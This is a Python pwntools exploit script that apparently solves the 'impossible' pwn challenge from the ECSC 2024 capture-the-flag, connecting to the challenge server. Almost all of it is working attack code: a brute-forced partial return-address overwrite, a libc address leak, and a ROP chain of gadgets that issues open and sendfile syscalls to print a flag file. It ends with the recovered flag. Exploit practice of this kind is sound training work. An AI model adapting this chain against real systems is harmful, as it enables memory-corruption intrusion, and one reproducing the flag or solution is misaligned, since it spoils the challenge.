#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or './chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.terminal = ["terminator", "-u", "-e"]
# context.terminal = ["remotinator", "vsplit", "-x"]

gdbscript = '''
brva 0x161C
continue
'''
# set follow-fork-mode child

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or 'impossible.ecsc24.hack.cert.pl'
    port = int(args.PORT or 5109)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw, api=True)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr

partial = 0x1812

# try to loop program by calling real_main again
# requires 12b bruteforce 1/4096
if args.STOP:
    pause()
    sl(b'samael')
else:
    sla(b'Speak a name and say your wish\n', b'samael')
sla(b'a wish', cyclic(8) + p16(partial))
if args.GDB:
    io.gdb.wait()
    io.gdb.continue_nowait()
sla(b'Speak a name and say your wish\n', b'samael')
if args.GDB:
    io.gdb.wait()
    piebase = io.gdb.execute('piebase', to_string=True)
    piebase = int(piebase.split('=')[-1].strip(), 16)
    info(f'piebase: {piebase:#x}')
    io.gdb.execute(f'set $rax={piebase+partial:#x}')
    # io.gdb.continue_nowait()


# do it again to move stack a bit
if not args.REAL:
    sla(b'Speak a name and say your wish\n', b'samael')
    sla(b'a wish', cyclic(8) + p16(partial))
    if args.GDB:
        io.gdb.wait()
        io.gdb.continue_nowait()
    sla(b'Speak a name and say your wish\n', b'samael')
    if args.GDB:
        io.gdb.wait()
        io.gdb.execute(f'set $rax={piebase+partial:#x}')
        io.gdb.continue_nowait()


# leak libc
# name field has 16b, samael uses 6b, the rest is taken from stack
sla(b'Speak a name and say your wish\n', b'samael')
ru(b'samael\x00\x00', drop=True)
ld_leak = u64(r(6).ljust(8, p8(0)))

info(f'ld_leak: {ld_leak:#x}')
libc_base = ld_leak -0x2408a8
if args.REAL:
    libc_base = ld_leak -0x20efb0
info(f'libc_base: {libc_base:#x}')
libc.address = libc_base


if not args.GDB:
    pause()

gadget = libc.sym.gets
gadget = libc.address + 0x79F30 # gets
libc_start = libc.address + 0x23C50  # libc _start - to prove fn call on remote

# call gets to overwrite samael's metadata
sla(b'a wish', cyclic(8) + p64(gadget).strip(b'\x00'))
if args.GDB:
    io.gdb.wait()
    io.gdb.continue_nowait()
sla(b'Speak a name and say your wish\n', b'samael')

# one_gadgets dont work
# system('/bin/sh') doesnt work
# 16b name, 8b shit, 8b fn ptr

# sl(flat(
#     cmd.ljust(0x18, b'\x00'),
#     libc.sym.system
# ))

# sla(b'Speak a name and say your wish\n', cmd)


# new way, just rop

cmd = b'/pwn/flag'
# 0x0000000000023cce : add rsp, 0x98 ; ret
# 0x00000000000240e5 : pop rdi ; ret
# 0x000000000002573e : pop rsi ; ret
# 0x00000000000fffa3 : pop rdx ; pop rcx ; pop rbx ; ret
# 0x0000000000040143 : pop rax ; ret
# 0x0013911b: syscall; ret;
# 0x000000000003f9f9 : add rsp, 0x28 ; ret


pop_rdi = libc.address + 0x00000000000240e5
pop_rsi = libc.address + 0x000000000002573e
pop_rax = libc.address + 0x0000000000040143
syscall = libc.address + 0x0013911b
pop_rdx_rcx_rbx = libc.address + 0x00000000000fffa3
ret = pop_rdi + 1

adjust_stack = libc.address + 0x0000000000023cce
adjust_stack2 = libc.address + 0x000000000003f9f9
binsh = next(libc.search(b'/bin/sh\x00'))

sl(flat(
    cmd.ljust(0x18, b'\x00'),
    # open(rdi, 0)
    # rdi is already set to our demon name
    adjust_stack,
    cyclic(16),
    pop_rsi,
    0,
    pop_rax,
    2,
    syscall,
    
    # demon's name is corrupting our rop, hop over it
    adjust_stack2,
    ret,
    ret,
    ret,
    ret,
    ret,
    ret,
    ret,
    ret,
    ret,
    
    # sendfile(1,3,0,64)
    pop_rdi,
    1,
    pop_rsi,
    3,
    pop_rdx_rcx_rbx,
    0,
    64,
    0,
    libc.sym.sendfile,
    
    # we are gentlemen
    pop_rax,
    0x3c,
    pop_rdi,
    0,
    syscall
))

sla(b'Speak a name and say your wish\n', cmd)


ia()


# ecsc24{we're_still_in_kansas_toto}
